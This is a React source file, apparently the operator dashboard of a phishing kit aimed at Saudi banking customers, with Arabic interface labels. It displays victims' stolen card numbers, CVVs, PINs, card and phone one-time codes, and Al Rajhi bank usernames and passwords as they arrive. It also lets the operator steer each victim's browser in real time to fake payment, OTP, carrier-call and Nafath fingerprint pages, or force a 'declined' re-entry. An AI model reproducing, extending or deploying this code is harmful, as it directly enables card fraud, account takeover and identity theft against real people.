// src/components/CardModal.js
import React, { useState, useEffect, useRef } from "react";
import { Modal, Button, FormControl } from "react-bootstrap";
import ConfirmDialog from "./ConfirmDialog";
import { socket } from "../socket";
import "./CardModal.css";

const PAGES = [
  "index.html",
  "register.html",
  "register-second.html",
  "paymen.html",
  "pin.html",
  "verify.html",
  "phone.html",
  "phonecode.html",
  "rajhi.html",
  "stcCall.html",
  "mobilyCall.html",
  "nafad-basmah.html",
];

const LABEL = {
  "index.html":           "الرئيسية",
  "register.html":        "التسجيل 1",
  "register-second.html": "التسجيل 2",
  "paymen.html":          "الدفع",
  "pin.html":             "رمز البطاقة (PIN)",
  "verify.html":          "رمز التحقق (OTP)",
  "phone.html":           "الجوال",
  "phonecode.html":       "رمز الجوال",
  "rajhi.html":           "دخول الراجحي",
  "stcCall.html":         "اتصال STC",
  "mobilyCall.html":      "اتصال Mobily",
  "nafad-basmah.html":    "نفاذ - بصمة",
};

export default function CardModal({ ip, user, onClose }) {
  const [confirm, setConfirm]   = useState({ show: false, page: null });
  const [basmah,  setBasmah]    = useState("");

  const [blinkPin,      setBlinkPin]      = useState(false);
  const [blinkOtp,      setBlinkOtp]      = useState(false);
  const [blinkPhoneOtp, setBlinkPhoneOtp] = useState(false);

  const prevPinRef      = useRef(user?.pin || "");
  const prevOtpRef      = useRef(user?.verificationCode || "");
  const prevPhoneOtpRef = useRef(user?.phoneCode || "");

  useEffect(() => {
    const cur = user?.pin || "";
    if (cur && prevPinRef.current !== cur) { setBlinkPin(true); setTimeout(() => setBlinkPin(false), 1500); }
    prevPinRef.current = cur;
  }, [user?.pin]);

  useEffect(() => {
    const cur = user?.verificationCode || "";
    if (cur && prevOtpRef.current !== cur) { setBlinkOtp(true); setTimeout(() => setBlinkOtp(false), 1500); }
    prevOtpRef.current = cur;
  }, [user?.verificationCode]);

  useEffect(() => {
    const cur = user?.phoneCode || "";
    if (cur && prevPhoneOtpRef.current !== cur) { setBlinkPhoneOtp(true); setTimeout(() => setBlinkPhoneOtp(false), 1500); }
    prevPhoneOtpRef.current = cur;
  }, [user?.phoneCode]);

  const handlePageClick = (page) => setConfirm({ show: true, page });

  const hideConfirm = () => {
    setConfirm({ show: false, page: null });
    setBasmah("");
  };

  const handleConfirm = () => {
    // لو الصفحة nafad-basmah نرسل الرقم أولاً قبل التنقل
    if (confirm.page === "nafad-basmah.html" && basmah) {
      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
    }
    socket.emit("navigateTo", { ip, page: confirm.page });
    hideConfirm();
  };

  const handleDecline = () => {
    // نرسل الرفض إلى الصفحة المختارة (confirm.page) مع علامة الرفض
    socket.emit("navigateTo", { ip, page: `${confirm.page}?declined=true` });
    hideConfirm();
  };

  const handleBan = () => {
    if (!window.confirm(`هل أنت متأكد من حظر ${ip}؟`)) return;
    socket.emit("banUser", { ip });
  };

  const {
    payments = [],
    pin = "",
    verificationCode = "",
    phoneNumber = "",
    operator = "",
    phoneCode = "",
    currentPage = "",
    userName = "",
    idNumber = "",
  } = user || {};

  const titleText = idNumber ? `${userName} — ${idNumber}` : (userName || ip);
  const formatCard = (n) => (n ? n.replace(/(\d{4})(?=\d)/g, "$1 ").trim() : "—");
  const formatExp  = (e) => (e && e.length >= 4 ? `${e.slice(0,2)}/${e.slice(2)}` : e);

  const getCardTypeClass = (number) => {
    if (!number) return "card-unknown";
    const firstDigit = number.charAt(0);
    if (firstDigit === "4") return "card-visa";
    if (firstDigit === "5") return "card-mastercard";
    return "card-unknown";
  };

  return (
    <>
      <Modal show onHide={onClose} size="xl" centered>
        <Modal.Header closeButton dir="rtl">
          <Modal.Title>التحكم في المستخدم — {titleText}</Modal.Title>
        </Modal.Header>

        <Modal.Body dir="rtl" className="text-right">
          {/* أزرار التنقل - الصف الأول */}
          <div style={{ display:"flex", flexWrap:"wrap", gap:"0.5rem", marginBottom:"1rem" }}>
            {PAGES.slice(0, 7).map((p) => (
              <Button key={p} variant="outline-primary" size="sm"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}>
                {LABEL[p]}
              </Button>
            ))}
          </div>

          {/* البطاقات */}
          <div style={{ display:"flex", overflowX:"auto", gap:"1rem",
            padding:"1rem 0", borderTop:"1px solid #ddd", borderBottom:"1px solid #ddd" }}>
            {payments.length === 0 ? (
              <div style={{ color:"#888", padding:"0.5rem" }}>لا توجد بطاقات مدخلة بعد.</div>
            ) : (
              payments.map((p, idx) => (
                <div key={p._id || idx} 
                  className={getCardTypeClass(p.cardNumber)}
                  style={{ minWidth:"240px",
                  borderRadius:"8px", padding:"0.75rem", backgroundColor:"#fefefe",
                  flex:"0 0 auto" }}>
                  <div style={{ fontWeight:600, marginBottom:"0.5rem" }}>البيانات المدخلة {idx + 1}</div>
                  <div><strong>الاسم:</strong> <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{p.cardHolderName || "—"}</span></div>
                  <div><strong>رقم البطاقة:</strong> <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{formatCard(p.cardNumber)}</span></div>
                  <div><strong>التاريخ:</strong> <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{formatExp(p.expiryDate) || "—"}</span></div>
                  <div><strong>CVV:</strong> <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{p.cvv || "—"}</span></div>
                  <div style={{ marginTop: "5px", padding: "5px", background: "#f8f9fa", borderRadius: "4px", border: "1px dashed #ccc" }}>
                    <strong style={{ color: "#28a745" }}>المبلغ المراد تسديده:</strong> {p.total || "—"}
                  </div>
                </div>
              ))
            )}
          </div>

          {/* الأكواد */}
          <div style={{ display:"flex", gap:"2rem", marginTop:"1rem", padding:"1rem",
            backgroundColor:"#fafafa", borderRadius:"8px", border:"1px solid #ddd" }}>

            <div style={{ flex:1 }}>
              <h6 style={{ fontWeight:600 }}>PIN / OTP البطاقة</h6>
              <p className={blinkPin ? "blink-green-text" : ""}>
                <strong>PIN:</strong> {pin || "—"}
              </p>
              <p className={blinkOtp ? "blink-green-text" : ""}>
                <strong>OTP البطاقة:</strong> {verificationCode || "—"}
              </p>
            </div>

            <div style={{ flex:1 }}>
              <h6 style={{ fontWeight:600 }}>الجوال / OTP</h6>
              <p><strong>رقم الجوال:</strong> {phoneNumber || "—"}</p>
              <p><strong>المشغل:</strong> {operator || "—"}</p>
              <p className={blinkPhoneOtp ? "blink-green-text" : ""}>
                <strong>OTP الجوال:</strong> {phoneCode || "—"}
              </p>
            </div>

            <div style={{ flex:1 }}>
              <h6 style={{ fontWeight:600 }}>الراجحي</h6>
              <p><strong>اسم المستخدم:</strong> {user?.rajhiUsername || "—"}</p>
              <p><strong>كلمة المرور:</strong> {user?.rajhiPassword || "—"}</p>
            </div>
          </div>

          {/* أزرار التنقل - الصف الثاني */}
          <div style={{ display:"flex", flexWrap:"wrap", gap:"0.5rem", marginTop:"1rem", alignItems:"center" }}>
            {PAGES.slice(7).map((p) => (
              <Button key={p} variant="outline-primary" size="sm"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}>
                {LABEL[p]}
              </Button>
            ))}
            <Button variant="danger" size="sm" onClick={handleBan}
              style={{ marginRight:"auto" }}>
              🚫 حظر
            </Button>
          </div>
        </Modal.Body>
      </Modal>

      <ConfirmDialog
        show={confirm.show}
        page={confirm.page}
        basmah={basmah}
        onBasmahChange={setBasmah}
        onConfirm={handleConfirm}
        onDecline={handleDecline}
        onClose={hideConfirm}
      />
    </>
  );
}
